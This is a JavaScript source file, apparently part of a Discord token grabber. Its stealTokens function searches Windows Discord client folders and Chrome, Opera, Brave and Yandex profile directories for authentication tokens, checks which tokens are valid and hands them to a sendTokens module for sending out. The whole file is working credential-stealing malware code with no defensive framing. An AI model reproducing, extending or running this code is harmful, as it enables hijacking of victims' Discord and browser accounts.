const fs = require("fs");
const TokenInfo = require("../classes/tokenInfo");
const {
  checkToken,
  getKey,
  decryptToken,
  searchTokens,
  getTokens,
} = require("./tokenUtils.js");
const sendTokens = require("./sendTokens");

async function stealTokens() {
  try {
    let paths;

    if (process.platform == "win32") {
      const local = process.env.LOCALAPPDATA;
      const roaming = process.env.APPDATA;

      paths = {
        Discord: `${roaming}/Discord`,
        "Discord Canary": `${roaming}/discordcanary`,
        "Discord PTB": `${roaming}/discordptb`,
        "Google Chrome": `${local}/Google/Chrome/User Data/Default`,
        Opera: `${roaming}/Opera Software/Opera Stable`,
        Brave: `${local}/BraveSoftware/Brave-Browser/User Data/Default`,
        Yandex: `${local}/Yandex/YandexBrowser/User Data/Default`,
      };
    }

    const validTokens = [];
    for (let [platform, path] of Object.entries(paths)) {
      if (fs.existsSync(path)) {
        const tokenList = getTokens(path);
        if (tokenList) {
          for (const token of tokenList.filter((t) => t !== undefined)) {
            const result = await checkToken(token);
            if (result !== null) {
              validTokens.push(new TokenInfo(platform, result));
            }
          }
        }
      }
    }

    if (validTokens.length > 0) {
      sendTokens(validTokens);
    } else {
      console.log("No valid tokens found.");
    }
  } catch (error) {
    console.error(`Steal tokens error: ${error}`);
  }
}

module.exports = stealTokens;
